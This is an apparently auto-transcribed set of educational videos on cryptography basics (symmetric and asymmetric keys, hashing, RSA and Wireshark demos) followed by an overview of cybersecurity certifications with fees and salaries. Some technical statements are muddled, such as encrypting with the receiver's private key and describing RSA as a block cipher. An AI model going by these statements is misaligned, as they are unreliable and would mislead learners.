obscure the information
widely considered the most secure form
of encryption albeit relatively slower
than AES it is widely used in web
browsing secure identification vpns
emails and chat applications
with so much hanging on the key secrecy
there must be a way to transmit the keys
without others reading our private data
many systems use a combination of
symmetric encryption and asymmetric
encryption to bolster security and match
speed at the same time since asymmetric
encryption takes longer to decrypt large
amounts of data the full information is
encrypted using a single key that is
symmetric encryption that single key is
then transmitted to the receiver using
asymmetric encryption so you don't have
to compromise either way another route
is using the Diffie helpman key exchange
which relies on a one-way function and
is much tougher to break into
the third variant of cryptography is
termed as hashing
hashing is the process of scrambling a
piece of data beyond recognition it
gives an output of fixed size which is
known as the hash value of the original
data or just hash in general the
calculations that do the job of messing
up the data collection form the hash
function they are generally not
reversible without resilient Brute Force
mechanisms and are very helpful when
storing data on website servers that
need not be stored in plain text for
example many websites store your account
passwords in a hashed format so that not
even the administrator can read your
credentials when a user tries to log in
they can compare the entered passwords
hash value with the hash value that is
already stored on the servers for
authentication since the function will
always return the same value for the
same input
cryptography has been in practice for
centuries
Julius Caesar used a substitution shift
to move alphabets a certain number of
spaces beyond their place in the
alphabet table a spy can't decipher the
original message at first glance for
example if he wanted to pass
confidential information to his armies
and decides to use the substitution
shift of plus 2 a becomes c b becomes D
and so on the word attack when passed
through a substitution shift of plus 3
becomes d w w d f n this Cipher has been
appropriately named the Caesar Cipher
which is one of the most widely used
algorithms
the Enigma is probably the most famous
cryptographic Cipher device used in
ancient history
it was used by the Nazi German armies
when the world wars they were used to
protect confidential political military
and administrative information and it
consisted of three or more rotors that
scrambled the original message depending
on the machine's State at that time the
decryption is similar but it needs both
machines to stay in the same state
before passing the ciphertext so that we
received the same plain text message
let's take a look at how our data is
protected while we browse the internet
thanks to cryptography here we have a
web-based tool that will help us
understand the process of RSA encryption
we see the entire workflow from
selecting the key size to be used until
the decryption of the ciphertext in
order to get the plain text back
as we already know RSA encryption
algorithm falls under the umbrella of
asymmetric key cryptography
that basically implies that we have two
keys at play here a public key and a
private key
typically the public key is used by the
sender to encrypt the message and the
private key is used by the receiver to
decrypt the message there are some
occasions when this allocation is
reversed and we will have a look at them
as well
in RSA we have the choice of key size we
can select any key from a 512 bit to
1024 bit all the way up to a 4096 bit
key the longer the key length the more
complex the encryption process becomes
and thereby strengthening the ciphertext
although with added security more
complex functions take longer to perform
the same operations on similar size of
data we have to keep a balance between
both speed and strength because the
strongest encryption algorithms are of
no use if they cannot be practically
deployed in systems around the world
let's take a 1024-bit key over here
now we need to generate the keys
this generation is done by functions
that operate on pass freezes the tool we
are using right now generates this
pseudorandom keys to be used in this
explanation once we generate the keys
you can see the public key is rather
smaller than the private key which is
almost always the case these two keys
are mathematically linked with each
other they cannot be substituted with
any other key and in order to encrypt
the original message or decrypt the
cipher text this pair must be kept
together the public key is then sent to
the sender and the receiver keeps the
private key with himself
in this scenario let's try an encrypt
the word simply learn
we have to select if the key being used
for encryption is either private or
public since that affects the process of
scrambling the information since we are
using the public key over here let's
select the same and copy it and paste
over here
foreign
RSA there are some modified ciphers with
their own pros and cons that can also be
used provided we use it on a regular
basis and depending on the use case as
well
once you click on encrypt we can see the
ciphertext being generated over here
the pseudorandom generating functions
are created in such a way that a single
character change in the plain text will
trigger a completely different
ciphertext this is a security feature to
strengthen the process from Brute Force
methods now that we are done with the
encryption process let's take a look at
the decryption part
the receiver gets this ciphertext from
the sender with no other key or
supplement he or she must already
possess the private key generated from
the same pair no other private key can
be used to decrypt the message since
they are mathematically linked we paste
the private key here and select the same
the cipher must always so be the same
used during the encryption process
once you click decrypt you can see the
original plain text we had decided to
encrypt this sums up the entire process
of RSA encryption and decryption
now some people use it the other way
around we also have the option of using
the private key to encrypt information
and the public key to decrypt it this is
done mostly to validate the origin of
the message since the keys only work in
pairs if a different private key is used
to encrypt the message the public key
cannot decrypt it conversely if the
public key is able to decrypt the
message it must have been encrypted with
the right private key and hence the
rightful owner here we just have to take
the private key and use that to encrypt
the plain text and select the same in
this checkbox as well you can see we
have generated a completely new Cipher
text
this Cipher text will be sent to the
receiver and this time we will use the
public key for decryption
let's select the correct checkbox and
decrypt
and we still get the same output
now let's take a look at practical
example of encryption in the real world
we all use the internet on a daily basis
and many are aware of the implications
of using unsafe websites let's take a
look at Wikipedia here pretty standard
https website where the edge stands for
secured let's take a look at how it
secures the data
Wireshark is the world's foremost and
most widely used Network protocol
analyzer it lets you see what's
happening on your network at a
microscopic level and we are going to
use the software to see the traffic that
is leaving our machine and to understand
how vulnerable it is
since there are many applications
running in this machine let's apply a
filter that will only show us the
results related to Wikipedia
[Music]
let's search for something that we can
navigate the website with
okay once we get into it a little you
can see some of the requests being
populated over here
let's take a look at the specific
request
these are the data packets that
basically transport the data from our
machine to the internet and vice versa
as you can see there's a bunch of
gibberish data here that doesn't really
reveal anything that we searched or
watched similarly other secured websites
function the same way and it is very
difficult if at all possible to Snoop on
user data this way
to put this in perspective
let's take a look at another website
which is a HTTP web page
this has no encryption enabled from the
server end which makes it vulnerable to
attacks there is a login form here which
needs legitimate user credentials in
order to Grant access
let's enter a random pair of credentials
these obviously won't work but we can
see the manner of data's transfer
unsurprisingly we weren't able to get
into the platform instead we can see the
data packets
let's apply a similar filter that will
help us understand
what request this website is sending
these are the requests being sent by the
HTTP login form to the internet if we
check here
see whatever username and password that
we are entering we can easily see it
with the Wireshark
now we used a dummy pair of credentials
if we select the right data packet we
can find our current credentials if any
website had asked for a payment
information or a legitimate credentials
it have been really easy to get a hold
of these
to reiterate what we have already
learned we must always avoid HTTP
websites and just unknown or not
trustworthy websites in general because
the problem we saw here is just the tip
of the iceberg even though cryptography
has managed to lessen the risk of cyber
attacks it is still prevalent and we
should always be alert to keep ourselves
safe online
there are two types of encryption in
cryptography
symmetric key cryptography
and asymmetric key cryptography both of
these categories have their pros and
cons and differ only by the
implementation
today we are going to focus exclusively
on symmetric key cryptography
let us have a look at its applications
in order to understand its importance
better
this variant of cryptography is
primarily used in banking applications
by personally identifiable information
needs to be encrypted with so many
aspects of banking moving on to the
internet having a reliable safety net is
crucial symmetric cryptography helps in
detecting bank fraud and boosts the
security index of these payment gateways
in general
they are also helpful in protecting data
that is not in transit and rests on
servers and data centers these centers
house a massive amount of data that
needs to be encrypted with a fast and
efficient algorithm so that when the
data needs to be recalled by the
respective service there is the
Assurance of minor to no delay
while browsing the internet we need
symmetric encryption to browse secure
https websites so that we get an
all-around protection it plays a
significant role in verifying website
server authenticity exchanging the
necessary encryption Keys required and
generating a session using those keys to
ensure maximum security
this helps us in preventing the rather
insecure HTTP website format
so let us understand how symmetric key
cryptography works first and before
moving on to the specific algorithms
symmetric key cryptography relies on a
single key for the encryption and
decryption of information
both the sender and receiver of the
message need to have a pre-shared secret
key that they will use to convert the
plain text into ciphertext and vice
versa as you can see in the image the
key used for encryption is the same key
needed for decrypting the message at the
other end the secret key shouldn't be
sent along with the ciphertext to the
receiver because that would defeat the
entire purpose of using cryptography key
exchange can be done beforehand using
other algorithms like the diffie-hellman
key exchange protocol for example
for example if Paul wants to send a
simple message to Jane they need to have
a single encryption key that both of
them must give secret to prevent
snooping on by malicious actors
it can be generated by either one of
them but must belong to both of them
before the messages start flowing
suppose the message I am ready is
converted into ciphertext using a
specific substitution Cipher by Paul in
that case Jane must also be aware of the
substitution shift to decrypt this
ciphertext once it reaches her
irrespective of the scenario where
someone manages to grab the ciphertext
mid transit to try and read the message
not having the secret key renders
everyone helpless looking to Snoop in
the symmetric key algorithms like the
data encryption standard have been in
use since the 1970s while the popular
ones like the AES have become the
industry standard today
with the entire architecture of symmetry
cryptography depending on the single key
being used you can understand whites of
Paramount importance to keep it secret
on all locations
the side effect of having a single key
for the encryption and decryption is it
becomes a single point of failure anyone
who gets their hand on it can read all
the encrypted messages and do so mainly
without the knowledge of the sender and
the receiver
so it is the priority to keep the
encryption and decryption key private at
all times
should it fall into the wrong hands the
third party can send messages to either
the sender or the receiver using the
same key to encrypt the message upon
receiving the message and decrypting it
with the key it is impossible to guess
its origin
if the sender somehow transmits the
secret key along with the cipher text
anyone can intercept the package and
access the information consequently this
encryption category is turned private
key cryptography since a big part of the
data's Integrity is riding on the
promise that the users can keep the key
secret this terminology contrasts with
asymmetry key cryptography which is
called public key cryptography because
it has two different keys at play one of
which is public
provided we manage to keep the keys
secret we still have to choose what kind
of ciphers we want to use to encrypt
this information in symmetric key
cryptography there are broadly two
categories of ciphers that we can employ
let us have a look
stream ciphers are the algorithms that
anchor basic information one bit at a
time
it can change depending on the algorithm
being used but usually it relies on a
single bit or byte to do the encryption
this is the relatively quicker
alternative considering the algorithm
doesn't have to deal with blocks of data
at a single time
every piece of data that goes into the
encryption can and needs to be converted
into binary format in stream ciphers
each binary digit is encrypted one after
the other the most popular ones are the
rc4 salsa and Panama
the binary data is passed through an
encryption key which is a randomly
generated bitstream upon passing it
through we receive the ciphertext that
can be transferred to the receiver
without fear of man in the middle
attacks the binary data can be passed
through an algorithmic function it can
have either X or operations as it is
most of the time or any other
mathematical calculations that have the
singular purpose of scrambling the data
the encryption key is generated using
the random bitstream generator and
attacks as a supplement in the
algorithmic function the output is in
binary form which is then converted into
the decimal or hexadecimal format to
give our final ciphertext
on the other hand block ciphers dissect
the raw information into chunks of data
of fixed size the size of these blocks
depend on the exact Cipher being used a
128 bit block Cipher will break the
plain text into blocks of 128 bit each
and encrypt those blocks instead of a
single digit once these blocks are
encrypted individually they are chained
together to form a final Cipher text
block ciphers are much slower but they
are more tamper-proof and are used in
some of the most widely used algorithms
employed today
just like stream ciphers the original
ciphertext is converted into binary
format before beginning the process once
the conversion is complete the blocks
are passed to the encryption algorithm
along with the encryption key
this would provide us
with the encrypted blocks of binary data
once these blocks are combined we get a
final binary string
this string is then converted into
hexadecimal format to get a ciphertext
today the most popular symmetric key
algorithms like AES des and 3des are all
block Cipher methodology subsets
with so many factors coming into play
there are quite a few things
symmetrically cryptography excels at
while falling short in some other
symmetric keyptography is much faster
variant when compared to asymmetric
keyptography there is only one key in
play unlike asymmetric encryption and
this drastically improves calculation
speed in the encryption and decryption
similarly the performance of symmetric
encryption is much more efficient under
similar computational limitations fewer
calculations help in better memory
management for the whole system
bulk amounts of data that need to be
encrypted are very well suited for
symmetric algorithms since they are much
quicker handling large amounts of data
is simple and easy to use in servers and
data forms this helps in better latency
during data recall and fewer mixed
packets
thanks to its simple single key
structure symmetric key cryptography
algorithms are much easier to set up a
communication Channel with and offer a
much more straightforward maintenance
duties once the secret key is
transmitted to both the sender and
receiver without any prior mishandling
the rest of the system aligns easily and
everyday Communications becomes easy and
secure if the algorithm is applied as
per the documentation symmetric
algorithms are very robust and can
encrypt fast amounts of data with very
less overhead in our last video on
cryptography we took a look at symmetric
key cryptography we used a single
private key for both the encryption and
decryption of data and it works very
well in theory let's take a look at a
more realistic scenario now
let's meet Joe
Joe is a journalist who needs to
communicate with Ryan via long distance
messaging
due to the critical nature of the
information people are waiting for any
message to leave Joe's house so that
they can intercept it
now Joe can easily use symmetrically
cryptography to send the encrypted data
so that even if someone intercepts the
message they cannot understand what it
says but here's a tricky part
how will Joe send the required
decryption key to Ryan the center of the
message as well as the receiver need to
have the same decryption key so that
they can exchange messages otherwise
Ryan cannot decrypt the information even
when he receives the cipher text if
someone intercepts the key while
transmitting it there is no use in
employing cryptography since a third
party can now decode all the information
easily key sharing is a risk that will
always exist when symmetric key
cryptography is being used thankfully
asymmetric key encryption has managed to
fix this problem
let's understand what asymmetric key
cryptography is
asymmetric encryption uses a double
layer of protection
there are two different keys at play
here a private key and a public key a
public key is used to encrypt the
information pre-transit and a private
key is used to decrypt the data post
Transit
these pair of keys must belong to the
receiver of the message the public keys
can be shared via messaging blog posts
or key servers and there are no
restrictions
as you can see in the image the two keys
are working in the system the sender
first encrypts the message using the
receiver's private key after which we
receive the cipher text the cipher text
is then transmitted to the receiver
without any other key on getting the
ciphertext the receiver uses his private
key to decrypt it and get the plain text
back there has been no requirement of
any key exchange throughout this process
therefore solving the most glaring flaw
faced in symmetric cryptography
the public key known to everyone cannot
be used to decrypt the message and the
private K which can decrypt the message
need not be shared with anyone the
sender and receiver can exchange
personal data using the same set of keys
as often as possible
to understand this better take the
analogy of your mailbox
anyone who wants to send you a letter
has access to the box and can easily
share information with you in a way you
can say the mailbox is publicly
available to all but only you have
access to the key that can open the
mailbox and read the letters in it
this is how the private key comes to
play no one can intercept the message
and read its contents since it's
encrypted once the receiver gets its
contents he can use his private key to
decrypt the information
both the public key and the private key
are generated so they are interlinked
and you cannot substitute other private
keys to decrypt the data
in another example if Anis wants to send
a message to Bob let's say it reads call
me today she must use Bob's public key
while encrypting the message upon
receiving the cipher message Bob can
proceed to use his private key in order
to decrypt the message and hence
complete Securities attained during
transmission without any need for
sharing the key
since this type of encryption is highly
secure it has many users in areas that
require High confidentiality
it is used to manage digital signature
so there is valid proof of a document's
authenticity
with so many aspects of business
transitioning to the digital sphere
critical documents need to be verified
before being considered authentic and
acted upon thanks to asymmetric
cryptography centers can now sign
documents with their private Keys anyone
who needs to verify the authenticity of
such signatures can use the sandals
public key to decrypt the signature
since the public and the private keys
are linked to each other mathematically
it's impossible to repeat this
verification with duplicate keys
document encryption has been made very
simple by today's standards but the
background implementation follows the
stimulus approach
in blockchain architecture asymmetric
key cryptography is used to authorize
transactions and maintain the system
thanks to its two key structures changes
are reflected across the blockchain's
peer-to-peer Network only if it is
approved from both ends along with
asymmetric key cryptography Stamper
proof architecture its non-repadiation
characteristic also helps in keeping the
network stable
we can also use asymmetric cryptography
combined with symmetrical cryptography
to monitor SSL or TLS encrypted
browsering sessions to make sure nobody
can still up personal information when
accessing banking websites or the
internet in general it plays a
significant role in verifying websites
of authenticity exchanging the necessary
encryption Keys required and generating
a session using those keys to ensure
maximum security instead of the rather
insecure HTTP website format security
parameters differ on a session by
session basis so the verification
process is consistent and utterly
essential to Modern data security
another great use of the asymmetric
keyptography structure is transmitting
keys for symmetric key cryptography with
the most significant difficulty in
symmetric encryption being key exchange
asymmetric keys can help clear the
shortcoming the original message is
first encrypted using a symmetric key
the key used for encrypting the data is
then converted into the ciphertext using
the receiver's public key now we have
two Cipher text to transmit to the
receiver on receiving both of them the
receiver uses his private key to decrypt
the symmetric key he can then use it to
decrypt the original information on
getting the key used to encrypt the data
while this may seem more complicated
than just asymmetric cryptography alone
symmetric encryption algorithms are much
more optimized for vast amounts of data
on some occasions
encrypting the key using asymmetric
algorithms will definitely be more
memory efficient and secure
you might remember us discussing why
symmetric encryption was called private
key cryptography let us understand why
asymmetric falls under the public key
cryptography
we have two keys at our disposal the
encryption key is available to everyone
the decryption key is supposed to be
private
unlike symmetric key cryptography there
is no need to share anything privately
to have an encrypted messaging system to
put that into perspective we share our
email address with anyone looking to
communicate with us it is supposed to be
public by Design so that our email login
credentials are private and they help in
preventing any data mishandling since
there is nothing hidden from the world
if they want to send us any encrypted
information this category is called the
public key cryptography
there are quite a few algorithms being
used today that follow the architecture
of asymmetric cryptography none more
famous than the RS encryption
RSA encryption is the most widely used
encryption or public key encryption
standard using asymmetric approach named
after its Founders reverse Shamir and
Edelman it uses block ciphers to obscure
the information
if you are unfamiliar with how block
ciphers work their encryption algorithms
that divide the original data into
blocks of equal size
the block size depends on the exact
Cipher being used once they are broken
down these blocks are encrypted
individually and later chained together
to form the final ciphertext
widely considered to be the most secure
form of encryption albeit relatively
slower than symmetric encryption
algorithms it is widely used in web
browsing secure identification vpns
emails and other chat applications
with so many variables in play there
must be some advantages that give
asymmetrical cryptography and Edge over
the traditional symmetric encryption
methodologies let's go through some of
them
there is no need for any reliable key
sharing channel in asymmetric encryption
it was an added risk in private key
cryptography that has been completely
eliminated in public key architecture
the key which is made public cannot
recruit any confidential information and
the only key that can decrypt doesn't
need to be shared publicly under any
circumstance
we have much more extensive key lengths
in RSA encryption and other asymmetric
algorithms like 2048 bits key and 4096
bit keys larger keys are much harder to
break into via brute force and are much
more secure
asymmetric key cryptography can use as a
proof of authenticity since only the
rightful owner of the keys can generate
the messages to be decrypted by the
private key the situation can also be
reversed encryption is done using a
private key and decryption is done by
the public key which would not function
if the correct private key is not used
to generate the message hence proving
the authenticity of the owner
it also has a tamper protection feature
where the message cannot be intercepted
and changed without invalidating the
private key used to encrypt the data
consequently the public key cannot
decrypt the message and it is easy to
realize the information is not 100
legitimate when and where the case
requires so importance of the cyber
security certification first and
foremost when I see a certification I
look at it from three different aspects
the first is the training itself which
allows me to gain the knowledge which
allows me to understand the aspects of
security or whatever the certification
is there for the second aspect is the
exam itself how do I need to prepare
myself for the exam and how do I need to
approach the exam how do I need to
ensure that I pass in my first attempt
and the third aspect is the
certification itself which allows me to
be eligible to apply for a particular
job role so obtaining a cyber security
certification ensures or shows uh to the
organization that you're applying to
that you do have that prerequisite
knowledge and you should be shortlisted
for an interview the knowledge that you
have gained during the training will
help you when you attend that in
interview and when you attempt to answer
the questions asked to you so these
certifications are designed for a
specific rule for example a forensic
investigation certificate will teach you
how to investigate a crime scene
forensically a digital crime scene for a
matter of fact a certified ethical
hacking course will teach you about
penetration testing so it is you who's
going to decide which certification you
require and then attempt get certified
on it of course a fresher with a cyber
security certification will have better
employment opportunities because they
can showcase their knowledge with the
certification that they already have
even professionals who want to enhance
their careers can get into manage real
or Advanced certifications to improve on
their knowledge and get promoted in
their job profiles so cyber security
certifications can be classified in
three different aspects the first one
being the foundational level then the
managerial level and the advanced level
in the previous video we just had a
small overview here we are going to
discuss about what the certification
covers how the exams are conducted and
the price points for each and every exam
so let's start with the foundational
certifications we start off with CCNA
which is the basic certification for
networking so the CCNA routing and
switching certification basically it
helps you build your networking career
you will join an organization as a
networking engineer where you can help
the organization establish the routing
uh the pathing of how data packets will
travel across the network this
certification covers all the basic
concepts that you require to understand
networking the basic requirements for
this certification are that the
candidate must have a bachelor's degree
but apart from that there are no other
prerequisites so it's just that you need
a bachelor's degree and then you can
apply uh you can study for this you can
undergo a training and then you can
attempt the exam the certification
provider obviously is Cisco so the
knowledge that is limited to this
training and certification is for Cisco
devices only the exam fees for this
certification is approximately 325
dollars the exam when it is conducted it
has around 50 to 60 odd questions which
need to be answered in 19 minutes the
type of questions that you're going to
get is multiple choice questions but you
have a question and four answers and you
have to choose the correct answers among
those drag and drop where you have to
click on an object and drag it to its
appropriate Place probably a
architectural diagram and you have to
let's say pick on a router and place it
into a particular position if you place
it correctly you answer the answer the
question correctly otherwise it's wrong
and a simulator where you go where there
could be a configuration you need to
configure it in a particular Manner and
then check whether the configuration is
correct or not the pass Mark is around
800 to 850 out of a possible thousand
marks so each question will have a
different weightage depending on the
depth of the question depending on the
difficult level of the question or the
difficulty level of the question which
would then count towards your marks and
if you score 800 to 850 that's when you
clear the exam the job rules as we have
discussed over here would be more more
on the net work administrator site or a
network engineer side depending on the
level of experience that you have the
salaries that are expected from these
job rules in the US are around fifty
five thousand dollars to ninety thousand
dollars annually the next one is the
CompTIA certification called Security
Plus compute is also a global
certification Authority for uh infosec
courses so this certification teaches
candidates on how to secure applications
networks and devices it focuses on
Hands-On practical skills in the field
of network security I have trained
people on this certification myself so I
know this certification is quite
Hands-On it deals with the concepts to
the core it helps you understand the
concepts and then in the Practical
Hands-On demo you need to execute the
Practical yourself so that you can gain
that knowledge the recommended level for
a candidate to attempt this training
would be at least around two years of
experience in the it sector in addition
if you have already been certified for
Network plus certification from comchia
which is the Baseline networking
certification this is also a preferred a
way to go for this certification as said
kamcha is the certificate provider and
the exam fees for this certification is
339 dollars the exam is quite simple 90
questions in 90 minutes that's one
minute per question it sounds like a lot
of time but believe me the questions can
be a little bit confusing can be a
little bit lengthy so you will require
all those 90 minutes to answer those
questions especially when they're tricky
and they're technical in nature the
questions would be multiple choice and
Performance Based the pass Mark for this
exam is around 750 points out of a
possible 900. the job profiles for this
kind of certification is when you want
to apply for a security analyst position
or a security Engineers position where
you're going to analyze some data to
understand and figure out what problems
are ongoing in the organization uh the
average annual salary of this person
would be around seventy two thousand
dollars then comes the ceh or the
certified ethical hacker training from
EC Council now this is a very well known
course and also uh PC council is a
global certifying Authority very well
accepted across a lot of countries uh
this is an offensive certification so
here you're basically trying to become a
penetration tester you're taught how to
hack you're taught how to attack a
particular organization from an ethical
hackers perspective so the job profiles
that you'll be looking here are of a pen
tester where you go into an organization
you test their security controls or
you'll test their devices find out flaws
within them and then provide
recommendations of how to plug those
flaws or mitigate those flaws and
improve the security of that
organization it is recommended that you
have two years of experience at least in
networking or security for these uh to
attempt this kind of trainings and
certifications again a basic
understanding of networking or maybe a
little bit of applications operating
systems would be necessary uh before
attempting this certification the
certification provider is easy Council
and the exam fees for this certification
is 500 so the exam here would be 125
questions which needs to be attempted in
four hours and you will only get
multiple choice questions in here now
for CH there are two exams one is the
multiple choice questions and the second
is a practical exam where you need to
solve some given problems to you in an
iLab scenario and if you are able to
solve them properly you then get
certified for ceh practical the cutoff
varies from 65 to 85 percent depending
on the questions that you have answered
and the weightage associated with each
and every question as said the job roles
would be as a penetration tester a
security engineer and your salaries
would start from around 90 000 annually
then comes the CND or the certified
Network Defender also from EC Council
now this is more on the network defense
side so here again the job rules would
be where you are where there's a network
that you have and you're going to try to
secure the network and the
communications that are going to travel
over the network so you need to be a
network administrator a network security
engineer or in a similar profile to
understand how Network books work and
then you're going to attempt to secure
those networks the certificate provider
again is easy Council and the
certification is placed a little bit
below ceh so it becomes Network defense
then CH where you're going to become a
penetration Tester the exam fees for
this certification is 350 US Dollars the
exam the exam is of 100 questions to be
answered in four hours again it's just a
multiple choice questions so you get a
question with four options you answer
the correct one and you move on to the
next question the past percentage
against varies from 60 to 85 percent
depending on the questions answered and
the weightage of that question job rules
to be applied Network defense technician
CND analyst or a security analyst from a
network perspective salaries would range
from 65 000 to 75 000 per annum then
comes the forensic investigator course
which is exactly what it is digital
forensic investigator this will help you
understand how computers work where data
is stored and how you can retrieve the
data to investigate a crime that has uh
taken place so the candidate must have
at least two years of experience in the
information security sector they need a
good understanding of how networks work
how computers work how operating systems
work how they store data the location
where that data is stored how databases
work how those databases store those
data and so on so forth this
certification is sought after mainly in
the law enforcement areas but there are
a few corporates that offer forensic
investigation as a service especially
when a corporate gets compromised and
they want to conduct their own
investigations the certification
provider for this is also EC Council and
the exam fees are 500 this is an
advanced level certification so
understanding of applications networks
and operating systems is a must before
you attend this the exam is quite
similar 150 questions in four hours
again it's just a multiple choice
question exam the cutoff again is from
60 to 85 percent depending on the
questions and the weightage of each and
every question job rules I.T security
Specialists network security pro the job
rules forensic investigators law
enforcement agencies security
Specialists homeland security jobs
annual salaries would be around 88 000
and above all right now let's talk about
the managerial level certifications
kobit stands for control objectives for
information and related Technologies
it's a certification that will give a
candidate an in-depth knowledge of the
framework which kobit is all about and
the framework helps you manage and
govern Enterprise ID environments now
this is Advanced certification so around
eight years of manageable experiences
suggested before you attempt the kobit 5
certification to understand all the
aspects and to help you implement the
framework properly the certification
certificate provider is isaka the exam
fee is around 175 dollars now this is a
small exam 50 questions but in 40
minutes so you really have to be on your
toes you have to know the knowledge that
is very limited time to think and you
have to be fast in your answers the past
percentage is 50 percent the job roles
associated with this certification would
be to when you apply for uh information
security manager or as a security
consultant or a cyber security manager
and your roles and responsibilities
would be the governed and I.T space that
the organization owns so all the servers
desktops the network the data flows the
databases everything and how it needs to
be managed and how it needs to be
governed in a secure manner annual
salaries would be around a hundred
thousand dollars plus then the cism also
called as system it stands for certified
information security manager and as the
name suggests it's a security manager
certification it helps the candidate in
understanding the relationship between
business goals and information security
so now you're going into the space where
you're not only technical in nature but
you also have to understand the business
needs the goals of the business and you
have to align the information security
of your infrastructure along with the
business needs and the business goals so
it is your inputs that are going to go
to the management to see if the
infrastructure is aligned to the
business goals or if the infrastructure
or the business goals need any fine
tuning around five years of work
experience is recommended in the
information security field for
attempting the cism out of the five
years the candidate must have a
background as an information security
manager for three years so you have some
experience as a manager you have
implemented those things yourselves
which will give you a better
understanding and then you attempt the
certification again providing by isaka
and the exam fees for isaka members is
575 dollars for non-members it is 760
dollars the exam is where you have to
answer 150 questions in four hours quite
a bit of time but questions are going to
be scenario based questions where
they're going to give you a lot of
scenarios you have to think about it and
you have to give the most probable and
the correct answer for that particular
scenario the Poshmark is 450 out of 800.
your job profile should be either a risk
manager or a risk consultant analyzing
the business requirements to the
infrastructure security that that you
have and to identify if there any risks
associated with the infrastructure
highlight those risks and then put in
security controls and manage those
controls in a way where security is
mitigated your average salaries would be
around 88 000 and above then the sisa or
the cisa the certified Information
Systems auditor certification it not
only looks into security but it also
looks into auditing and controls uh in
Information Systems this is a highly
repeated certificate and you gain a
better understanding of governance
regulations and auditing your
information landscape again a minimum of
five years of work work experience in
the field of Information Systems
auditing control or security is
necessary now here the question would be
what's the difference security is where
your technical in nature you have done
let's say a vulnerability assessment or
a penetration test you have implemented
firewalls you have architected security
controls are all about the security
controls that you're going to implement
like firewalls idss ipss data loss
prevention systems maybe even
utms and whatnot so experience in
architecting or implementing those
controls in an effective manner
mitigating your security or your your
vulnerabilities that you have identified
in the organization and auditing would
basically mean about looking at
compliance to ensure that everything is
in place you're compliant with let's say
ISO 27001 guidelines or the policies
that you have created yourself and
everything is working in order so it's
more of a checklist where you're going
to just check everything is in place and
you're conforming to standards this
certification is also provided by isaka
and the exam fees for isaka members of
575 dollars whereas non-isaka members
will have to pay 760 dollars for the
certification 100 questions again in
four hours multiple choice questions
scenario based so you have to really
understand this uh real world scenarios
of where what controls and what audit
mechanisms should be in place pass Mark
is 450 out of 800. your job rules would
be mainly becoming an auditor or a
senior auditor a director for
information security information audit
manager or information technology
consultant where you provide
Intelligence on how the company should
Implement their infrastructure average
salaries would be 103 000 and above then
comes the crisc also called as crisp
certified in risk and information
systems control certification helps the
candidate design and maintain
Information Systems controls for an
organization this is one of the most
sought after certifications as far as
risk management is concerned in Europe
and in us if you have this kind of
certifications you automatically qualify
for a risk manager or a security risk
manager or a information security
consultant kind of role you should have
a minimum of three years of experience
in the field of is controls that means
information security controls you should
have knowledge about firewalls you
should know about how to mitigate risks
how to identify risks in the first place
risk analysis risk management and after
which you're going to implement security
controls to mitigate that risk or bring
it to acceptable levels at this point in
time you will also be responsible to
create policies revolving those risks
and how you want to calculate those
risks and treat those risks in their
lifetime certificate provider again is
the Saka 575 dollars for isaka members
760 dollars for non-isaka members for
the exam fees a similar question 150
questions to be answered in four hours
multiple choice based on performances so
they may give you a scenario where you
have to perform a risk analysis and
provide a report and a solution based on
your findings again the pass Mark is 450
out of 800. the job profile Associated
as discuss during earlier are the it
risk management professionals where
they're going to identify risks treat
those risks calculate analyze maybe do a
business impact analysis to a certain
how the organization is going to be
affected and then you will also be
looking at compliances as far as these
job rules are concerned average annual
salary would be 119 000 and above moving
on to advanced level certification now
this is where we come across a cissp or
the cisp certification certified
information system security professional
this is the gold standard of all
certifications if you have this
certificate it's you can basically be
assured of a job in the IT world now
just to qualify you'll have to have five
years of experience in the information
security field there are eight domains
that are specified by cisp and you have
to prove that you have knowledge and
your work experience of around five
years in at least two of those domains
if you do not have those kind of
experiences you can still attempt the
exam but you become an associate of IC
Square which means that you get six
years to accomplish the five years of
experience requirement for this
certification before taking up the
certification is suggested that the
candidate clears all the intermediate
level certifications not all but some of
them in fact I've seen people do the
other way around they qualify for cissp
they give the exam once your cisp the
sisa or CIS or cism exams are way easier
to crack but you need to have that kind
of experience I have seen people with 15
years of experience and more fail at
this certification in the first attempt
the certificate provider is IC Square
the exam fees is 699 like I said this
certification is most sought after the
gold standard in fact there is hardly
any other certifications after this that
you might want to do the questions now
the exam has changed if it is the
English version that you're giving it's
150 questions to be answered in three
hours if it is a non-english exam that
you are tempting then it is 250
questions in six hours it's is a
marathon and if you're opting for the
six hour exam you need to plan it really
well it sounds really easy but the
questions are quite tough they're
scenario based and the answers are quite
confusing as well you would get multiple
choice questions you would get drag and
drop and you might get simulators as
well uh the pass Mark is 700 out of 1000
but each question has a different
weightage so it depends on which
questions are asked of you and which
questions you've answered correctly the
job rules associated with this
certification would be anything and
everything in information security at
the managerial level and above so
information security manager risk
manager system information system
security officer the CSO role the ciso
Chief Information Security Officer any
role that you might think of as a risk
from a risk compliance strategy could be
achievable after this kind of a
certification the average annual salary
is 108 000 for this certification so to
be an ethical hacker you must hold a
certification which Specializes aims
ethical hacking or in cyber security
companies look for candidates who are
globally certified when we say globally
certified they're looking for a
certificate that has been given by an
organization that is recognized globally
and is well accepted in the industry so
these are the top five certifications a
candidate can obtain the first one
become a certified ethical hacker then
there is global information assurance
certification penetration tester then
offensive security certified
professional CompTIA pen Test Plus and
finally the license penetration tester
now these certifications are offered by
different organizations all of these
organizations are recognized globally
and their certifications are well
accepted in the technical space so let's
start off with the certified ethical
hacker and we'll look at the
organizations that provide these
certifications and how we can attain
them so ceh or certified ethical hacker
in its current form is in its version 10
it's been revised and updated over a
period of time easy council is the
certifying Authority for ceh they have
their own authorized training centers
through which you can attend trainings
give those exams get yourself certified
and thus become globally certified and
can be eligible to apply for security
related jobs it is a very well known
certification and is widely accepted at
the same time it would test the
candidate's knowledge of security
threats and preventive measures now
there are two types of exams that you
can give with ceh one is a multiple
choice question exam which is
theoretical in nature they ask you
questions and you answer the correct you
select the correct answers if you're
clear you get certified the second
certification nowadays is where there's
a practical exam associated with it
that's a you'll have to purchase the
voucher for that exam and give that exam
the Practical exam is held in a Virtual
Lab where they you're given scenarios
and based on those scenarios you have to
resolve the questions given to you and
give proof of the resolution which would
then get you certified as an ethical
hacker the theoretical exam in this
scenario is the fees is around 500 this
is for the multiple choice question exam
where you can pay the fees and you can
attend through a online portal and he
can give the exam directly the exam is
four hours long in which you have to
answer 125 questions now four hours for
125 questions seems a long time but it
isn't it's a very technical exam there
are scenario based questions and it
would take some time for you to analyze
and understand the question and then
identify the equivalent correct answer
so it's a very competitive exam and
you'll have to study really hard to
clear this exam as well the cutoff for
